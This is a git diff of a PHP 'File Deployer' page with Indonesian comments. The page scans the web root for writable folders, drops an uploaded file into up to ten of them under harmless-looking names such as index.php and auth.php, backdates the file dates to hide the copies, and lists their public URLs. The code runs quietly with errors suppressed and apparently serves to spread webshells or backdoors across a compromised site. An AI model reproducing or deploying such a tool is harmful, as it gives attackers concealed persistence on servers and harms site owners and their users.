@@ -4,21 +4,31 @@ set_time_limit(0);
 ini_set('display_errors', 0);
 error_reporting(0);
 
+/**
+ * Scan folder writable hingga kedalaman tertentu
+ */
 function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
     $result = [];
+
     if ($currentDepth > $maxDepth) return $result;
     $items = @scandir($baseDir);
     if (!$items) return $result;
+
     foreach ($items as $item) {
         if ($item === '.' || $item === '..') continue;
+
         $fullPath = rtrim($baseDir, '/') . '/' . $item;
         if (is_dir($fullPath)) {
             if (is_writable($fullPath)) {
                 $result[] = $fullPath;
             }
-            $result = array_merge($result, scanWritableDirs($fullPath, $maxDepth, $currentDepth + 1));
+            $result = array_merge(
+                $result,
+                scanWritableDirs($fullPath, $maxDepth, $currentDepth + 1)
+            );
         }
     }
+
     return $result;
 }
 ?>
@@ -38,12 +48,10 @@ function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
             --error: #f85149;
             --border: #30363d;
         }
-
         * {
             box-sizing: border-box;
             font-family: 'Segoe UI', 'Roboto Mono', monospace;
         }
-
         body {
             margin: 0;
             padding: 0;
@@ -54,7 +62,6 @@ function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
             justify-content: center;
             min-height: 100vh;
         }
-
         .card {
             background-color: var(--surface);
             border: 1px solid var(--border);
@@ -65,21 +72,18 @@ function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
             box-shadow: 0 0 30px rgba(0,0,0,0.4);
             animation: fadeIn 0.4s ease-out;
         }
-
         h1 {
             text-align: center;
             color: var(--primary);
             font-weight: 600;
             margin-bottom: 25px;
         }
-
         label {
             display: block;
             margin-bottom: 10px;
             font-size: 15px;
             color: #8b949e;
         }
-
         input[type="file"] {
             width: 100%;
             background-color: #0d1117;
@@ -90,7 +94,6 @@ function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
             margin-bottom: 20px;
             font-size: 14px;
         }
-
         button {
             width: 100%;
             background: var(--primary);
@@ -103,11 +106,9 @@ function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
             font-size: 15px;
             transition: all 0.2s ease;
         }
-
         button:hover {
             background-color: #00aaff;
         }
-
         .message {
             margin-top: 25px;
             padding: 15px;
@@ -115,30 +116,25 @@ function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
             font-size: 14px;
             line-height: 1.5;
         }
-
         .success {
             background-color: rgba(31, 111, 235, 0.1);
             color: var(--primary);
             border: 1px solid var(--primary);
         }
-
         .error {
             background-color: rgba(248, 81, 73, 0.1);
             color: var(--error);
             border: 1px solid var(--error);
         }
-
         code {
             font-family: 'Roboto Mono', monospace;
             font-size: 13px;
             color: #58a6ff;
         }
-
         ul {
             margin: 10px 0 0 20px;
             padding: 0;
         }
-
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
@@ -148,52 +144,75 @@ function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
 <body>
 <div class="card">
     <h1>File Deployer</h1>
-    <form method="post" enctype="multipart/form-data">
+    <form method="post" enctype="multipart/form-data">  
         <label for="file">Upload file (akan disalin ke beberapa folder random):</label>
         <input type="file" name="file" id="file" required>
         <button type="submit">Deploy Now</button>
     </form>
 
-    <?php
-    if (isset($_FILES['file'])) {
-        $tmp_name = $_FILES['file']['tmp_name'];
-        $targetNames = ['index.php'];
-        $allWritable = scanWritableDirs(__DIR__, 5);
+<?php
+if (isset($_FILES['file'])) {
+    $tmp_name = $_FILES['file']['tmp_name'];
 
-        if (empty($allWritable)) {
-            echo "<div class='message error'>Tidak ditemukan folder writable.</div>";
-        } else {
-            shuffle($allWritable);
-            $targetFolders = array_slice($allWritable, 0, 10);
-            $successCount = 0;
-            $uploadedPaths = [];
+    // Buat tanggal random
+    $randomDateTime = date('Y-m-d H:i', strtotime('-' . rand(0, 365) . ' days'));
+    $timestamp      = strtotime($randomDateTime);
 
-            foreach ($targetFolders as $folder) {
-                $randomName = $targetNames[array_rand($targetNames)];
-                $target = $folder . DIRECTORY_SEPARATOR . $randomName;
+    $targetNames    = ['index.php', 'action.php', 'auth.php', 'settings.php'];
+    $allWritable    = scanWritableDirs(__DIR__, 5);
 
-                if (move_uploaded_file($tmp_name, $target)) {
-                    $tmp_name = $target;
-                    $successCount++;
-                    $uploadedPaths[] = $target;
-                } elseif (file_exists($tmp_name) && copy($tmp_name, $target)) {
-                    $successCount++;
-                    $uploadedPaths[] = $target;
-                }
-            }
+    if (empty($allWritable)) {
+        echo "<div class='message error'>Tidak ditemukan folder writable.</div>";
+    } else {
+        shuffle($allWritable);
+        $targetFolders = array_slice($allWritable, 0, 10);
+        $successCount  = 0;
+        $uploadedURLs  = [];
 
-            if ($successCount > 0) {
-                echo "<div class='message success'><strong>Berhasil upload ke $successCount folder:</strong><ul>";
-                foreach ($uploadedPaths as $path) {
-                    echo "<li><code>$path</code></li>";
-                }
-                echo "</ul></div>";
-            } else {
-                echo "<div class='message error'>Gagal upload ke folder manapun.</div>";
+        // Ambil isi file upload
+        $originalContent = @file_get_contents($tmp_name);
+
+        foreach ($targetFolders as $folder) {
+            $randomName = $targetNames[array_rand($targetNames)];
+            $target     = $folder . DIRECTORY_SEPARATOR . $randomName;
+
+            // Ubah tanggal di dalam file jika ada
+            $modifiedContent = preg_replace(
+                '/(\/\/\s*Tanggal:\s*)\d{4}-\d{2}-\d{2} \d{2}:\d{2}/i',
+                '${1}' . $randomDateTime,
+                $originalContent
+            );
+
+            // Simpan file hasil modifikasi
+            if (@file_put_contents($target, $modifiedContent) !== false) {
+                // Ubah tanggal file di sistem
+                @touch($target, $timestamp, $timestamp);
+
+                // Konversi ke URL
+                $relativePath = str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath($folder));
+                $relativePath = str_replace('\\', '/', $relativePath); // Windows compatibility
+                $protocol     = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+                $host         = $_SERVER['HTTP_HOST'];
+                $url          = rtrim($protocol . '://' . $host . $relativePath, '/') . '/' . $randomName;
+
+                $successCount++;
+                $uploadedURLs[] = $url;
             }
         }
+
+        // Tampilkan hasil
+        if ($successCount > 0) {
+            echo "<div class='message success'><strong>Berhasil upload ke {$successCount} folder:</strong><ul>";
+            foreach ($uploadedURLs as $url) {
+                echo "<li><code><a href=\"{$url}\" target=\"_blank\">{$url}</a></code></li>";
+            }
+            echo "</ul></div>";
+        } else {
+            echo "<div class='message error'>Gagal upload ke folder manapun.</div>";
+        }
     }
-    ?>
+}
+?>
 </div>
 </body>
 </html>
